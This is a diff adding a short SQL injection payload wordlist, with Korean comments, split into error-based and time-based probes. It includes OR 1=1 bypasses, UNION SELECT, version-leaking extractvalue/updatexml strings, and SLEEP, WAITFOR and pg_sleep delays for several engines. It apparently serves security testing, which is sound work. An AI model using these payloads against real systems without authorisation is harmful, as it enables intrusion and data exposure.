@@ -1,0 +1,24 @@
+# SQL Injection - 응답으로 확인 가능한 패턴 위주 (오류 기반 / 시간 기반)
+# --- 오류 기반: DB 구문 오류를 유발해 에러 메시지 노출 유도 ---
+'
+"
+')
+' "
+1'
+1"
+' OR '1'='1
+' OR 1=1--
+admin'--
+' UNION SELECT null--
+' AND 1=CONVERT(int,@@version)--
+' AND extractvalue(1,concat(0x7e,version()))--
+" AND updatexml(1,concat(0x7e,version()),1)--
+# --- 시간 기반: 취약 시 응답이 지연됨 (엔진별 변형) ---
+1' AND SLEEP(5)--
+1" AND SLEEP(5)--
+1' OR SLEEP(5)--
+1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
+'; WAITFOR DELAY '0:0:5'--
+1); WAITFOR DELAY '0:0:5'--
+' AND pg_sleep(5)--
+' || pg_sleep(5)--
